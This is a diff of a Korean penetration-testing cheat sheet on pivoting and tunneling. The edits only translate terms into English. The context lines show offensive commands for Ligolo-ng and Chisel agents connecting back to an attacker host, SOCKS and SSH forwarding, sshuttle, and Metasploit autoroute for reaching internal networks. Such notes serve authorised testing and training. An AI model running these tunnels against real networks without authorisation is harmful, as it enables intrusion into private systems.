@@ -1,12 +1,12 @@
 # Pivoting / Tunneling
 
-승차 테이크 한 거점에서 직접 닿지 않는 다른 내부 세그먼트로 트래픽을 흙려보내는 작업. 제대로 터널링이 잡혀야 내부망이 진짜로 열린다.
+승차 테이크 한 거점에서 직접 닿지 않는 다른 내부 세그먼트로 트래픽을 흙려보내는 작업. 제대로 tunneling이 잡혀야 내부망이 진짜로 열린다.
 
 ---
 
 ## Ligolo-ng
 
-가장 편리한 터널링 도구. TUN 인터페이스 기반으로 별도 프록시 없이 직접 통신 가능.
+가장 편리한 tunneling 도구. TUN 인터페이스 기반으로 별도 proxy 없이 직접 통신 가능.
 
 ### 공격자 (Proxy Server)
 
@@ -25,7 +25,7 @@ sudo ip link set ligolo up
 # 라우팅 추가 (별도 터미널)
 sudo ip route add 10.0.0.0/24 dev ligolo
 
-# 터널 시작
+# tunnel 시작
 >> start
 ```
 
@@ -39,23 +39,23 @@ sudo ip route add 10.0.0.0/24 dev ligolo
 .\agent.exe -connect ATTACKER:11601 -ignore-cert
 ```
 
-### 리스너 (Reverse Connection)
+### listener (Reverse Connection)
 
 ```bash
-# ligolo session에서 리스너 추가
+# ligolo session에서 listener 추가
 >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 
 # 내부 호스트에서 피봇 호스트의 4444로 연결하면
-# 공격자의 4444로 포워딩됨
+# 공격자의 4444로 forward 됨
 ```
 
 ---
 
 ## Chisel
 
-HTTP/SOCKS5 터널링. 단일 바이너리, 크로스플랫폼.
+HTTP/SOCKS5 tunneling. 단일 binary, cross-platform.
 
-### SOCKS 프록시
+### SOCKS proxy
 
 ```bash
 # 공격자 (서버)
@@ -75,18 +75,18 @@ proxychains nxc smb 10.0.0.5
 ### Port Forwarding
 
 ```bash
-# 원격 포트 포워딩
+# 원격 port forwarding
 ./chisel client ATTACKER:8080 R:8888:10.0.0.5:80
 # → 공격자의 localhost:8888 = 내부 10.0.0.5:80
 
-# 로컬 포트 포워딩
+# 로컬 port forwarding
 ./chisel client ATTACKER:8080 8888:10.0.0.5:80
 # → target의 localhost:8888 = 내부 10.0.0.5:80
 ```
 
 ---
 
-## SSH 터널링
+## SSH tunneling
 
 ```bash
 # Local Port Forwarding
@@ -105,7 +105,7 @@ ssh -R 4444:localhost:4444 user@PIVOT
 ssh -J user@PIVOT1 user@PIVOT2
 ssh -J user@PIVOT1,user@PIVOT2 user@INTERNAL
 
-# SSH 터널 백그라운드
+# SSH tunnel 백그라운드
 ssh -f -N -D 1080 user@PIVOT
 ```
 
@@ -132,7 +132,7 @@ proxychains evil-winrm -i INTERNAL_TARGET -u admin -p pass
 ## sshuttle
 
 ```bash
-# Python 기반 VPN-like 터널 (SSH 통해)
+# Python 기반 VPN-like tunnel (SSH 통해)
 sshuttle -r user@PIVOT 10.0.0.0/24
 
 # SSH 키
@@ -151,7 +151,7 @@ sshuttle --dns -r user@PIVOT 10.0.0.0/24
 meterpreter> run autoroute -s 10.0.0.0/24
 meterpreter> background
 
-# SOCKS 프록시
+# SOCKS proxy
 msf> use auxiliary/server/socks_proxy
 msf> set SRVPORT 1080
 msf> run -j
